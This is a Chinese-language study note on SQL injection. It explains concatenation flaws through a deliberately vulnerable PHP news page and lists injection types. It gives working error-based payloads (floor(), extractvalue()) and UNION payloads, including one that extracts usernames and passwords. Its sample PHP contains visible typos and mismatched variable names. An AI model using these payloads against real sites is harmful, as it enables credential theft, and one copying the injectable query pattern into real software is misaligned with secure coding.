在原有结构基础上填充新的内容，引发结构逻辑变化，称之为注入。

SQL注入漏洞是服务器在处理SQL语句时错误地拼接用户提交参数，打破了原有的SQL执行逻辑，导致攻击者可部分或完全掌握SQL语句执行效果的一类安全问题。

>我的思考：
>
>这句话感觉上，高度概括了SQL注入漏洞的原理；核心在“拼接”二字上。其实，精一而悟道——很多漏洞payload的构造都在于拼接。
>
>拼接 = 数据域的闭合+ 逻辑域的添加

因为一些SQL语句测试的时候，需要进入phpstudy环境下的MySQL命令行，下面给出方法步骤

>F:\phpstudy\PHPTutorial\MySQL\bin
>
>mysql -h localhost -u root -p
>
>root

### SQL注入示例😊

以Apache+PHP+MySQL为例，用户提交的数据通过浏览器发送，为了区别不同的新闻内容，用户选择的URL后面会带有“id=1”字段。Apache服务器收到这个字段，然后传递给脚本语言PHP进行解释执行。例如，网站提供的是新闻服务，使用的脚本语言为news.php，代码如下。

```php
<?php
$id = $_GET["id"];
if (!$id) {
    echo "无法找到新闻".'<br/>';
    exit;//终止脚本执行
}
$servername = "localhost";
$username = "root";
$password = "admin123";
$dbname = "news";

$coon = new mysqli($servername,$username,$password);

if ($coon->coonect_error) {
    die("连接失败：".$conn->connect_error).'<br/>';
    //输出一条消息并退出当前脚本
    exit;
}

$result = mysql_query("SELECT * FROM acticle WHERE id=".$id);

while($row = mysql_fetch_array($result))
{
    echo $row['title']." ".$row['content'];
    echo "<br/>";
}

mysql_close($conn);
?>
```

以上代码的含义：网站会根据用户提交的id参数进行数据库查询，于是MySQL数据库执行了这样一条语句`SELECT * FROM article WHERE id=1`。

可以看到此处直接将用户提交的参数拼接进SQL语句的，例如：

```php
"select * from post_log where id=".$_GET['id']
```

其中“$_GET['id']”来自于HTTP请求第一行"?"后面的GET参数。这个位置的内容，攻击者是可以随意改写的。对于PHP语言来说，以“.”来拼接两个字符串内容，相当于把它们拼接起来代入数据库执行。

### SQL注入的分类

由于SQL注入漏洞相对于其他漏洞来说形成较早，研究SQL注入的人很多。所以有关SQL注入漏洞也有很多特殊的分类名词。从挖掘技巧上看有报错注入、Union注入、布尔注入、时间注入、DNS查询注入；从SQL注入参数在HTTP请求中的位置来划分有GET注入、POST注入、Cookie注入、Referer注入、User-Agent注入等；从存在SQL语句中的前后位置来划分有表名注入、条件（Where）注入、Order by注入、Limit注入等；从注入参数的查询类型以及闭合符来划分有整型（数字型）注入、字符型注入、搜索型（like）注入、In注入、混合型注入等；更具数据库的不同，又有Mysql注入、Oracle、Access注入等

![image-20240127211030558](https://raw.githubusercontent.com/m1crofan/image/main/image-20240127211030558.png)

>对于搜索型、In型注入比较陌生

### SQL注入检测、攻击方法

#### 1.报错注入

(1)基于报错的SQL注入检测方法

报错注入即是一种SQL注入检测方法，同时也是利用SQL注入读取数据的方法。作为检测方法，攻击者在判断一个参数是否存在SQL注入漏洞时，会尝试拼接单引号、反斜杠字符。例如“id=1”。

这样的字符如果被拼接传入SQL语句中会变成如下情况。

```sql
select * from post_log where id =1'
```

于是引起了一个SQL语法错误，数据库引擎会抛出错误，根据不同的开发模式，有些网站可能会将错误信息打印在网站上，如下所示。

```txt
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
```

如果发生了这样的报错，证明攻击者拼接的单引号起作用了。这个位置是具有SQL注入漏洞的。同理，反斜杠也是SQL语句中的一个特殊字符。作为转义符号。它会转义后面的字符内容。例如：

```sql
select * from post_log where id='1\'
```

原本正常闭合的单引号被转义符打破了，最后形成了一个未闭合的语句。

(2)基于报错的SQL注入攻击

报错注入还可以用来发起攻击。在一些场景下，通过报错回显将目标数据打印在网页上。以下是网络上广为流传的10种MySQL报错注入方法。

**floor() 函数**

```sql
select * from test where id=1 and (
    select 1 from(
        select count(*),concat(user(),floor(rand(14)*2))x from information_schema.tables 	   group by x
    )a
)
```

>核心原理就是：当group by时会产生一个临时的新表；在进行数据比对的时候：如果主键相同，那么直接把count(*)的数量加一，如果主键不相同，那么会插入新的主键。漏洞根本的成因在于，数据对比时会进行一次`rand(0)*2`的运算，在插入数据的时候又会进行一次`rand(0)*2`的运算。当新插入的主键在表中原本就存在，那么就会导致主键冲突。
>
>拿sqllab的第一关做测试：注意mysql的注释是`--+`
>
>![image-20240128151011742](https://raw.githubusercontent.com/m1crofan/image/main/image-20240128151011742.png)
>
>参考链接：
>
>[关于floor()报错注入，你真的懂了吗？ ](https://www.freebuf.com/articles/web/257881.html)
>
>[Mysql报错注入之floor(rand(0)*2)报错原理探究](https://www.freebuf.com/column/235496.html)

**extractvalue()函数**

```sql
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
```

>extractvalue(xml_frag,xpath_expr)函数时，若xpath_expr参数不符合xpath格式，就会报错。而~符号（ascii编码值：0x7e）是不存在xpath格式中的，所以一旦在xpath_expr参数中使用~符号，就会产生xpath语法错误。

>这个函数我在命令行实验的时候，并不能报出包含用户名的错误。
>
>🤔这是为🐎捏~(￣▽￣)~*
>
>![image-20240128231628527](https://raw.githubusercontent.com/m1crofan/image/main/image-20240128231628527.png)

....还有剩下的8种，个人认为属于进阶内容；之后慢慢补充。

#### 2.UNION注入

关键字`union`能够执行一个或多个其他`select`查询，并将结果追加到原始查询中。例如：

```sql
SELECT a,b FROM table1 UNION SELECT c,d From table2
```

此SQL查询返回一个包含两列的单个结果集。若要使`UNION`查询正常工作，必须满足两个关键要求：

- 各个查询必须返回相同数量的列。
- 每列中的数据类型必须在各个查询之间兼容。

>😏union注入的核心要点

查询列数：

使用order by子句并递增指定的列索引，直到发生错误。

```sql
' ORDER BY 1--
' ORDER BY 2--
....
```

或者，提交一系列UNION SELECT有效负载，指定不同数量的null值：

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

对于oracle数据库，由于每个SELECT查询必须使用FROM关键字并指定有效的表。Oracle上有一个内置的表，称为`dual`可以用于此目的。

```
' UNION SELECT NULL FROM DUAL--
```

此处payload使用注释符`--`注释掉注入点之后的原始查询的其余部分。在mysql中，双破折号后必须跟一个空格或者`#`，也就是：`--+` 或者`--#`

⚠：无论是使用order by 还是使用填充null的联合注入；HTTP响应并不一定会返回数据库错误，要看具体的代码实现。

确认所需列数之后，可以探测每列是否可以保存字符串数据。例如：

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

查询单列中的多个值

在某些情况下，可能只有一列可以利用。我们可以通过不同数据库的不同语法将多个值连接起来，可以在单个列中同时检索多个值。同时，可以包含一个分割符，以便区分不同的值。如，在Oracle上，可以提交输入：

```sql
' UNION SELECT username || '~' || password FROM users--
```

>不同的数据库使用不同的语法来执行值连接，可以查询portswigger的SQL注入备忘录。[SQL injection cheat sheet ](https://portswigger.net/web-security/sql-injection/cheat-sheet)

2024-1-28暂停一会，去复习csrf

>SQL注入的内容真的很多😥，慢慢学~😊
